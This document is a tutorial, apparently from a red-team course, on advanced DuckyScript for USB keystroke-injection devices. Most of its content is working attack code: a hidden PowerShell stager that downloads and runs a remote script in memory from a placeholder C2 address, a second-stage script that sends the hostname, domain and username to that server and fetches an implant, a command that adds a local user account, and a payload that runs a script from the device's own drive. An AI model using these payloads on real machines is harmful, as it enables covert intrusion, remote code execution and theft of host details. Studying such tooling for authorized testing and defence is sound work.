Section 1

REPEAT Command DuckyScript 1.0+

The REPEAT command repeats the previous command a specified number of times. It is primarily used for navigating menus with arrow keys, filling fields, or rapidly pressing modifier combinations without typing each line explicitly.

DuckyScript — REPEAT Examples 
REM Navigate down 5 items in a menu
DOWN
REPEAT 4

REM Press Tab 8 times to advance through a form
TAB
REPEAT 7

REM Type a string of underscores as a separator
STRING _
REPEAT 39
REM Result: 40 underscores typed in total
Section 2

Conditional Execution: IF / ELSE / END_IF DuckyScript 3.0

DuckyScript 3.0 (introduced with the Rubber Ducky revision 3 in late 2022) adds full conditional logic. Conditionals use built-in extension functions to check OS type, button state, or previous command outcomes. This is the most significant capability upgrade from the original language.

DuckyScript 3.0 — Conditional Syntax 
REM IF/ELSE syntax in DuckyScript 3.0
REM Condition must evaluate to TRUE or FALSE

IF ($_OS == "WINDOWS") THEN
    GUI r
    DELAY 700
    STRING powershell -NoP -W Hidden -Exec Bypass
    ENTER
ELSE IF ($_OS == "MACOS") THEN
    COMMAND SPACE
    DELAY 700
    STRING Terminal
    ENTER
    DELAY 1200
ELSE
    REM Assume Linux
    CTRL ALT t
    DELAY 1200
END_IF
$_OS Detection

The $_OS built-in variable is populated by the Rubber Ducky 3 firmware using the USB descriptor negotiation phase to identify the host OS. On pico-ducky running CircuitPython, this variable is not natively supported — you must implement OS detection manually using PowerShell's $PSVersionTable.OS or environment variable checks written into your payload logic.

Section 3

Variables and Functions DuckyScript 3.0

DuckyScript 3.0 introduces typed variables and user-defined functions, enabling reusable payload components and dynamic string construction. Variables are declared with VAR and referenced with $ prefix.

DuckyScript 3.0 — Variables and Functions 
REM Variable declaration
VAR $username = "testuser"
VAR $delay_short = 500
VAR $delay_long = 2000
VAR $output_path = "C:\\Users\\Public\\out.txt"

REM Using variables in DELAY
DELAY $delay_long

REM Using variables in STRING
STRING net user $username P@ssw0rd! /add

REM User-defined function
FUNCTION open_powershell()
    GUI r
    DELAY $delay_short
    STRING powershell -W Hidden
    ENTER
    DELAY $delay_long
END_FUNCTION

REM Call the function
open_powershell()
Section 4

Multi-Stage Payloads

Complex engagements require payloads that execute in phases — typically: Stage 0 (the DuckyScript itself) downloads and executes Stage 1 (a script hosted on an attacker-controlled server), which in turn fetches and runs Stage 2 (the final implant). This architecture minimizes what is stored on the USB device and maximizes flexibility.

DuckyScript — Stage 0: Stager Download and Execute 
REM Stage 0: Download and execute remote PowerShell script
REM The remote script (stage1.ps1) lives on an attacker-controlled HTTPS server

DEFAULTDELAY 100
DELAY 3000

GUI r
DELAY 700

REM IEX (Invoke-Expression) executes the downloaded script in memory
REM Nothing is written to disk — fileless execution
STRING powershell -NoP -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://192.0.2.10/stage1.ps1')"
ENTER
AMSI and Fileless Execution

Windows Antimalware Scan Interface (AMSI) scans the content passed to IEX / Invoke-Expression even when executing in memory. Windows Defender and most commercial EDR products flag IEX(New-Object Net.WebClient).DownloadString as a known malicious pattern. In authorized red team engagements, you will need to use AMSI bypass techniques covered in dedicated advanced red team courses.

PowerShell — Stage 1: Recon and Stage 2 Pull 
# stage1.ps1 — hosted on attacker C2 server
# Gathers quick recon and pulls stage 2 only if target matches criteria

$hostname = $env:COMPUTERNAME
$domain   = $env:USERDOMAIN
$user     = $env:USERNAME

# Phone home with basic recon
$body = @{ h=$hostname; d=$domain; u=$user } | ConvertTo-Json
Invoke-RestMethod -Uri "https://192.0.2.10/checkin" -Method POST -Body $body -ContentType "application/json"

# Only pull stage 2 if on corporate domain
if ($domain -ne "WORKGROUP") {
    IEX(New-Object Net.WebClient).DownloadString("https://192.0.2.10/stage2.ps1")
}
Section 5

OS Detection and Adaptive Payloads

On pico-ducky (CircuitPython), the $_OS variable from Rubber Ducky 3 firmware is unavailable. The practical workaround is a conservative approach: attempt execution on all three platforms and use timing to ensure the correct one succeeds. Alternatively, use a platform-specific indicator before deploying.

DuckyScript — Practical Multi-OS Adaptive Approach 
REM Adaptive payload using sequential attempts
REM Works because only one shortcut will succeed on any given OS

DEFAULTDELAY 100
DELAY 3000

REM Attempt 1: Windows — GUI+R opens Run dialog
GUI r
DELAY 600
STRING powershell -W Hidden -Exec Bypass -Command "whoami > C:\Users\Public\os.txt"
ENTER
DELAY 1000

REM Escape any opened dialogs on non-Windows systems
ESCAPE
DELAY 200

REM Attempt 2: macOS — Command+Space opens Spotlight
COMMAND SPACE
DELAY 700
STRING Terminal
ENTER
DELAY 1500
STRING id > /tmp/os.txt
ENTER
DELAY 500
COMMAND w

REM Attempt 3: Linux — Ctrl+Alt+T opens terminal
CTRL ALT t
DELAY 1500
STRING id > /tmp/os.txt; exit
ENTER

Section 6

Combining HID and Mass Storage

Some attack platforms (Hak5 Bash Bunny, USB Armory, modified Pi Pico with CircuitPython storage mode) can enumerate as both a HID keyboard and a USB mass storage device simultaneously. This allows the payload to drop files onto the USB drive and have the HID component execute them — eliminating the need for a remote C2 server.

CircuitPython — Enable HID + Mass Storage Mode (boot.py) 
# boot.py — runs before code.py on every power-up
# This enables both HID and storage mode simultaneously

import usb_hid
import storage
import supervisor

# Always enable HID (keyboard)
usb_hid.enable((usb_hid.Device.KEYBOARD,))

# Enable mass storage — device appears as both keyboard AND USB drive
storage.enable_usb_drive()

# This is the pico-ducky approach for Bash Bunny-style combined mode
# The CIRCUITPY drive becomes readable/writable by the host after enumeration
DuckyScript — Execute File from USB Mass Storage 
REM The USB drive enumerates as drive letter E:\ (or D:\, varies)
REM Use PowerShell to locate the drive and execute from it

DEFAULTDELAY 100
DELAY 4000

GUI r
DELAY 700

REM Find the USB drive by its volume label "CIRCUITPY" and execute payload
STRING powershell -W Hidden -Exec Bypass -Command "$drive = (Get-WmiObject Win32_Volume | Where-Object {$_.Label -eq 'CIRCUITPY'}).DriveLetter; if ($drive) { & $drive\payload.ps1 }"
ENTER
